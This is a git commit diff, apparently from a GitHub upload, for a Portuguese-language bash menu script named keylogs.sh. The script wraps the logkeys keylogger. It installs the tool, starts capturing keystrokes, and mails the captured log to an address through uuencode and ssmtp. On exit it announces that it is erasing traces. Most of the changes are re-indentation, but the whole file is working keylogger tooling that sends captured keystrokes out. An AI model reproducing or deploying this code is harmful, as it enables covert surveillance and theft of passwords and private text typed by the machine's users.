e441ff97cbfc44344ab5accfcff1153032dcc97f
Luan <36345746+kleytonluan@users.noreply.github.com>
2018-06-20 21:36:39 -0300

    Add files via upload

--- keylogs.sh
+++ keylogs.sh
@@ -10,17 +10,12 @@ arquivo3='/etc/logkeys'
 
 echo -e "INICIANDO O SISTEMA DE KEYLOGGER"
 sleep 1
-echo -e " -> APAGANDO ARQUIVOS"
-sleep 1
 echo -e " -> INICIANDO DOWNLOADS NECESSÁRIOS"
 sleep 1
 
 if [ -f "$arquivo2" ] || [ -f "$arquivo3" ]; then
-	echo -e " -> UNZIP NÃO ENCONTRADO. BAIXANDO..."
-	apt-get install unzip -y
-	sleep 1
-	echo -e " -> LOGKEYS NÃO ENCONTRADO. BAIXANDO..."
-        apt-get install logkeys -y
+	echo -e " -> UNZIP E LOGKEYS NÃO ENCONTRADO. BAIXANDO..."
+	apt-get install unzip logkeys -y
 	sleep 1
 else
 	echo -e " -> UNZIP E LOGKEYS JÁ BAIXADOS!"
@@ -45,81 +40,87 @@ read resposta
 case "$resposta" in
 	0|"")
         echo -e "OPÇÃO $resposta -> INICIANDO O KEYLOGGER:"
-	logkeys -s -m keymaps/pt_BR.map
-	sleep 1
-	echo -e " -> INICIADO!"
-	sleep 1
-	clear
+	    logkeys -s -m keymaps/pt_BR.map
+	    sleep 1
+	    echo -e " -> INICIADO!"
+	    sleep 1
+	    clear
 	;;
 	1)
         echo -e "OPÇÃO $resposta -> ABRINDO JANELA DE LOG DO LOGKEYS E INICIANDO O SISTEMA: "
-        gnome-terminal -x bash -c "tail -f $log; exec $SHELL";
-	sleep 1
-	clear
+        	if pgrep gnome-terminal > /dev/null 
+		    then
+			    gnome-terminal -x bash -c "tail -f $log; exec $SHELL";
+		    else
+		    	apt-get install gnome-terminal -y
+	        	gnome-terminal -x bash -c "tail -f $log; exec $SHELL";
+		    fi
+	    sleep 1
+	    clear
 	;;
 	2)
         echo -e "OPÇÃO $resposta -> DIGITE O E-MAIL PARA ENVIAR OS LOGS?"
-	read email
-	sleep 1
-	echo -e "ENVIANDO LOGS PARA: $email"
-	subject="Relatorio de acesso - Keylogger"
-   	content="Confira o que foi digitado em sua máquina. Anexo!"
-   	(echo -e "$subject\n$content\n"; uuencode $log logkeys.txt ) | ssmtp $email
-	sleep 1
-	echo -e "E-MAIL ENVIADO!"
-	sleep 1
-	clear
+	    read email
+	    sleep 1
+	    echo -e "ENVIANDO LOGS PARA: $email"
+	    subject="Relatorio de acesso - Keylogger"
+   	    content="Confira o que foi digitado em sua máquina. Anexo!"
+   	    (echo -e "$subject\n$content\n"; uuencode $log logkeys.txt ) | ssmtp $email
+	    sleep 1
+	    echo -e "E-MAIL ENVIADO!"
+	    sleep 1
+	    clear
     	;;
     	3)
         echo -e "OPÇÃO $resposta -> SAIR DO SISTEMA"
-	sleep 1
-	echo -e " -> DESEJA REALMENTE SAIR DO SISTEMA? [S] [N]"
-	read resp
-	if [ $resp == "s" ]; then
-		echo -e " -> SAINDO..."
-		sleep 1
-		logkeys -k
-		sleep 1
-		echo " -> APAGANDO RASTROS"
-		sleep 1
-			if [ -f "$arquivo1" ]; then
-				echo -e " -> APAGANDO PASTA $arquivo1"
-#				cd ..
-#				rm -rf keyloggerlinux/
-				sleep 1
-			else
-				echo -e " -> PASTA $arquivo1 JÁ APAGADA!"
-				sleep 1
-			fi
-				echo -e " -> SISTEMA FINALIZADO."
-			        exit
-	else
-		echo -e " -> RESTORNANDO PARA O MENU"
-		sleep 1
-		clear
-	fi
-	;;
+	    sleep 1
+	    echo -e " -> DESEJA REALMENTE SAIR DO SISTEMA? [S] [N]"
+	    read resp
+	        if [ $resp == "s" ]; then
+	            echo -e " -> SAINDO..."
+	            sleep 1
+		        logkeys -k
+		        sleep 1
+		        echo " -> APAGANDO RASTROS"
+		        sleep 1
+			    if [ -f "$arquivo1" ]; then
+				    echo -e " -> APAGANDO PASTA $arquivo1"
+#			        cd ..
+#	   	    	        rm -rf keyloggerlinux/
+		    		sleep 1
+		    	else
+		    		echo -e " -> PASTA $arquivo1 JÁ APAGADA!"
+		    		sleep 1
+		       	fi
+		   		echo -e " -> SISTEMA FINALIZADO."
+		        exit
+	        else
+		        echo -e " -> RESTORNANDO PARA O MENU"
+		        sleep 1
+		        clear
+	        fi
+	    ;;
         4)
-	echo -e "OPÇÃO $resposta -> SAIR DO SISTEMA"
-        cd ..
-        echo -e " -> SAINDO DO SISTEMA"
-        sleep 1
-	if [ -f "$arquivo1" ]; then
-        	echo -e " -> APAGANDO $arquivo1"
-#		cd ..
-#               rm -rf keyloggerlinux/
-                sleep 1
-       	else
-        	echo -e " -> PASTA $arquivo1 JÁ APAGADA!"
-                sleep 1
-	fi
-        echo -e " -> SISTEMA FINALIZADO."
-        exit
-	;;
+	        echo -e "OPÇÃO $resposta -> SAIR DO SISTEMA"
+            cd ..
+            echo -e " -> SAINDO DO SISTEMA"
+            sleep 1
+	            if [ -f "$arquivo1" ]; then
+        	        echo -e " -> APAGANDO $arquivo1"
+#		            cd ..
+#                   rm -rf keyloggerlinux/
+                    sleep 1
+       	        else
+        	        echo -e " -> PASTA $arquivo1 JÁ APAGADA!"
+                    sleep 1
+	            fi
+            echo -e " -> SISTEMA FINALIZADO."
+            exit
+	    ;;
     	*)
-        echo " -> OPÇÃO $resposta -> OPÇÃO INVÁLIDA!"
-	sleep 1
-	clear
+            echo " -> OPÇÃO $resposta -> OPÇÃO INVÁLIDA!"
+	        sleep 1
+	        clear
 ;;
 esac
 done
